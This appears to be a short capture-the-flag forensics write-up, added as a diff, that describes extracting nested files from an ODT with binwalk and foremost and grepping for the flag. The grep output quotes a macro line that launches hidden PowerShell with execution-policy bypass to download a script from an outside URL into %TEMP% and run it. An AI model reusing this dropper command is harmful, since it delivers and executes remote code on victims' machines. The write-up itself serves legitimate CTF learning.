@@ -1,0 +1,8 @@
+when init analyze using binwalk there are many nested file. so i use foremost to extract them all. then using grep recursive
+grep -rw byu .
+grep: ./output/png/00002261.png: binary file matches
+grep: ./output/zip/00000000.zip: binary file matches
+./output/zip/Basic/Project/NewMacros.xml:    FGHNBVRGHJJGFDSDUUUU = &quot;cmd /K &quot; + &quot;byu&quot; + &quot;ctf&quot; + &quot;{&quot; + &quot;m@ldocs @re&quot; + &quot;sn@eky and bad}&quot; + &quot;e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object      System.Net.WebClient).DownloadFile(&apos;http://bsrc.baidu.com/drill/doc-zh.html&apos;,&apos;%TEMP%\Y.ps1&apos;);      poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile      -file %TEMP%\Y.ps1&quot;
+grep: ./output/zip/Pictures/1000000000000500000002D0AD962E6A5DC3B411.png: binary file matches
+grep: ./bing-chilling.odt: binary file matches
+grep: ./bingchilling.zip?token=eyJ1c2VyX2lkIjoxNjIwLCJ0ZWFtX2lkIjo3NTksImZpbGVfaWQiOjc3fQ.ZGkJfg.wkEjrOW1uTpk-DpYB-1_SHs-iyc: binary file matches
